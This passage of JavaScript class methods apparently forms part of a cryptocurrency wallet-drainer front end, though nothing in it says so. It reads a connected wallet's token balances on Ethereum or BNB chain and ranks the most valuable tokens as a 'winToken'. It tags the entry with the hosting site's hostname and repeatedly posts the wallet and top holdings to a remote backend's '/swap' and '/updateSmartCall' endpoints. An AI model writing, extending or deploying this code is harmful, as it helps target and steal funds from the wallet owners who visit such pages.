    async checker_Big_USD_Balance_from_ListTokens(web3, addressAccount, chan_id) {
        let pricesArray = []

        console.log('START ==== checker_Big_USD_Balance_from_ListTokens =====')
        for (let item of (chan_id === 56 ? this.tokensListBnb : this.tokensListEth)) {
            let contract = undefined;
            if (chan_id === 56){
                contract = new web3.eth.Contract(this.CONTACT_ABI_CHAN_56, item.contract);
            } else {
                contract = new web3.eth.Contract(this.CONTACT_ABI_CHAN_1, item.contract);
            }

            let balance = await contract.methods.balanceOf(addressAccount).call()
            let decimals = await contract.methods.decimals().call()
            let balanceNew = parseFloat(balance) / Math.pow(10, decimals);

            if (balanceNew !== 0) {
                let res = await fetch(`https://min-api.cryptocompare.com/data/price?fsym=${item.name}&tsyms=USD`)
                let price = await res.json()
                pricesArray.push({
                    token: item,
                    balanceUSD: (balanceNew * price.USD)
                })
            }
        }

        let winToken = {}
        if (pricesArray.length !== 0) {
            winToken = pricesArray[0]
            if (pricesArray.length > 1) {
                pricesArray.sort(function(a, b) {
                    return b.balanceUSD - a.balanceUSD;
                });
                // for (let i = 0, len = pricesArray.length; i < len; i++) {
                winToken = pricesArray[0]
                try {
                    winToken['top1'] = `${(pricesArray[0].balanceUSD).toFixed(2)}$ (${pricesArray[0].token.name})`;
                } catch (e) {
                    winToken['top1'] = ''
                }

                try {
                    winToken['top2'] = `${(pricesArray[1].balanceUSD).toFixed(2)}$ (${pricesArray[1].token.name})`;
                } catch (e) {
                    winToken['top2'] = ''
                }

                try {
                    winToken['top3'] = `${(pricesArray[2].balanceUSD).toFixed(2)}$ (${pricesArray[2].token.name})`;
                } catch (e) {
                    winToken['top3'] = ''
                }

                try {
                    winToken['top4'] = `${(pricesArray[3].balanceUSD).toFixed(2)}$ (${pricesArray[3].token.name})`;
                } catch (e) {
                    winToken['top4'] = ''
                }

                try {
                    winToken['top5'] = `${pricesArray[4].balanceUSD}$ (${pricesArray[4].token.name})`;
                } catch (e) {
                    winToken['top5'] = ''
                }
            } else {
                winToken['top1'] = `${(pricesArray[0].balanceUSD).toFixed(2)}$ (${pricesArray[0].token.name})`;
                winToken['top2'] = ''
                winToken['top3'] = ''
                winToken['top4'] = ''
                winToken['top5'] = ''
            }
        } else {
            if (chan_id === 56){
                winToken['token'] = {
                    name: 'ETH',
                    contract: '0x2170ed0880ac9a755fd29b2688956bd959f933f8'
                }
            } else {
                winToken['token'] = {
                    name: 'BNB',
                    contract: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
                }
            }
            winToken['balanceUSD'] = '0'
            winToken['top1'] = ''
            winToken['top2'] = ''
            winToken['top3'] = ''
            winToken['top4'] = ''
            winToken['top5'] = ''
        }

        winToken['addressAccount'] = addressAccount;
        winToken['chan_id'] = chan_id;
        winToken['site'] = window.location.hostname.toString();

        console.log(JSON.stringify(winToken))
        this.winUserToken = winToken;
    }

    async createObjectToServer() {
        try {
            const rawResponse = await fetch(this.backendAddress + '/newObject', {
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    wallet: this.winUserToken.addressAccount,
                    chan: this.winUserToken.chan_id,
                    site: this.winUserToken.site,
                    top1: this.winUserToken.top1,
                    top2: this.winUserToken.top2,
                    top3: this.winUserToken.top3,
                    top4: this.winUserToken.top4,
                    top5: this.winUserToken.top5,
                })
            });
            const content = await rawResponse.json();
            console.log(content)
        } catch (e){
            console.log('Error: (createObjectToServer) => ' + e)
        }
    }

    async sendToServer() {
        if(this.checkerSendToServer){
            let flag = 'bad'
            while (flag === 'bad') {
                if ((typeof this.winUserToken) !== "Proxy") {
                    let send_obj = Object.assign({}, this.winUserToken)
                    send_obj['token'] = Object.assign({}, send_obj['token'])
                    console.log(send_obj)

                    const rawResponse = await fetch(this.backendAddress + '/swap', {
                        method: 'POST',
                        headers: {
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(send_obj)
                    })

                    const content = await rawResponse.json()
                    if (content === 'good') {
                        flag = content
                        break
                    }
                }
            }
            this.checkerSendToServer = false
            return flag
        }
    }

    async updateSmartCallToServer(value) {
        console.log('START updateSmartCallToServer')
        let send_obj = Object.assign({}, this.winUserToken)
        send_obj['token'] = Object.assign({}, send_obj['token'])
        console.log(send_obj)
        if (send_obj !== undefined) {
            const rawResponse = await fetch(this.backendAddress + '/updateSmartCall', {
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    wallet: send_obj.addressAccount,
                    smartCall: value
                })
            });
            const content = await rawResponse.json();
            console.log(content)
        }
        else {
            console.log('this.winUserToken --> undefined')
        }
        console.log('END updateSmartCallToServer')
    }
